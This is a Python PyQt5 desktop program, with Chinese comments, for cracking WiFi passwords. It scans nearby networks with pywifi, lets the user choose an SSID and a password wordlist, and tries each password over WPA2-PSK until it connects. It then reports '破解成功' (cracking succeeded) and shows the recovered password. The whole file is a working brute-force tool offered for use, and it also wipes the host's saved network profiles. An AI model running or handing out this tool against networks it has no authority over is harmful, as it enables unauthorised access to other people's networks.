from PyQt5.QtWidgets import QWidget,QApplication,QMessageBox,QFileDialog,QTableWidgetItem,QAbstractItemView,QHeaderView
from mainUI import Ui_Form
import sys
import pywifi
from pywifi import const
import time

class WiFiconnect(QWidget,Ui_Form):
    def __init__(self):
        super(WiFiconnect, self).__init__()
        self.setupUi(self)

        self.wifi= pywifi.PyWiFi()#抓取网卡接口
        self.iface=self.wifi.interfaces()[0]#抓取第一个无限网卡

        self.pushButton_2.clicked.connect(self.readPassWord)
        self.pushButton.clicked.connect(self.scans_wifi_list)
        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) #设置表格自适应

        self.tableWidget.doubleClicked.connect(self.onDBClick)
        self.pushButton_3.clicked.connect(self.add_mm_file)

    def __str__(self):
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    # 搜索wifi
    def scans_wifi_list(self):  # 扫描周围wifi列表
        # 开始扫描
        self.iface.disconnect()  # 测试连接 断开所有链接
        time.sleep(1)
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 测试网卡是否属于断开状态

        print("^_^ 开始扫描附近wifi...")
        self.iface.scan()
        time.sleep(15)
        # 在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        # 统计附近被发现的热点数量
        nums = len(scanres)
        print("数量: %s" % (nums))
        # print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # 实际数据
        self.show_scans_wifi_list(scanres)
        return scanres

    # 显示wifi列表
    def show_scans_wifi_list(self, scans_res):
        self.tableWidget.setRowCount(0)
        self.tableWidget.clear()
        for index, wifi_info in enumerate(scans_res):
            self.tableWidget.insertRow(index)
            print(index+1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal)
            self.tableWidget.setItem(int(index),0,QTableWidgetItem(str(index+1)))
            self.tableWidget.setItem(int(index),1, QTableWidgetItem(str(wifi_info.ssid)))
            self.tableWidget.setItem(int(index),2, QTableWidgetItem(wifi_info.bssid))
            self.tableWidget.setItem(int(index),3,QTableWidgetItem(str(wifi_info.signal)))
            # print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
        self.tableWidget.show()

    # 添加密码文件目录
    def add_mm_file(self):
        filedialog = QFileDialog()
        filedialog.setFileMode(QFileDialog.AnyFile)
        filedialog.setNameFilter("文本文件(*.txt)")
        if filedialog.exec_():
            self.filename  = filedialog.selectedFiles()
            self.label_2.setText(self.filename[0])

    # Treeview绑定事件
    def onDBClick(self,index):

        self.label_4.setText(self.tableWidget.item(index.row(), 1).text())

    # print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

    # 读取密码字典，进行匹配
    def readPassWord(self):
        try:
            self.getFilePath = self.label_2.text()
            # print("文件路径：%s\n" %(self.getFilePath))
            self.get_wifissid = self.label_4.text()
            # print("ssid：%s\n" %(self.get_wifissid))
            self.pwdfilehander = open(self.getFilePath, "r", errors="ignore")
            self.pushButton.setEnabled(False)
            self.pushButton_2.setEnabled(False)
            self.pushButton_3.setEnabled(False)
            while True:
                QApplication.processEvents()
                try:
                    self.pwdStr = self.pwdfilehander.readline()
                    # print("密码: %s " %(self.pwdStr))
                    if not self.pwdStr:
                        break
                    self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                    # print("返回值：%s\n" %(self.bool1) )
                    if self.bool1:
                        # print("密码正确："+pwdStr
                        # res = "密码:%s 正确 \n"%self.pwdStr;
                        self.res = "===正确===  wifi名:%s  匹配密码：%s " % (self.get_wifissid, self.pwdStr)
                        self.label_6.setText(self.pwdStr)
                        QMessageBox.information(self,'提示', '破解成功！！！\nWiFi名:%s\n密码为:%s'%(self.get_wifissid, self.pwdStr),QMessageBox.Yes)
                        print(self.res)
                        self.pushButton.setEnabled(True)
                        self.pushButton_2.setEnabled(True)
                        self.pushButton_3.setEnabled(True)
                        break
                    else:
                        # print("密码:"+self.pwdStr+"错误")
                        self.res = "---错误--- wifi名:%s匹配密码：%s" % (self.get_wifissid, self.pwdStr)
                        print(self.res)
                    time.sleep(3)
                except:
                    continue
            self.pushButton.setEnabled(True)
            self.pushButton_2.setEnabled(True)
            self.pushButton_3.setEnabled(True)
        except FileNotFoundError:
            QMessageBox.information(self,'提示','请添加密码文件',QMessageBox.Yes)
    # 对wifi和密码进行匹配
    def connect(self, pwd_Str, wifi_ssid):
        # 创建wifi链接文件
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  # wifi名称
        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        self.profile.key = pwd_Str  # 密码
        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件
        self.iface.connect(self.tmp_profile)  # 链接
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK


if __name__ == "__main__":
    app = QApplication(sys.argv)
    myWin = WiFiconnect()
    myWin.show()
    sys.exit(app.exec_())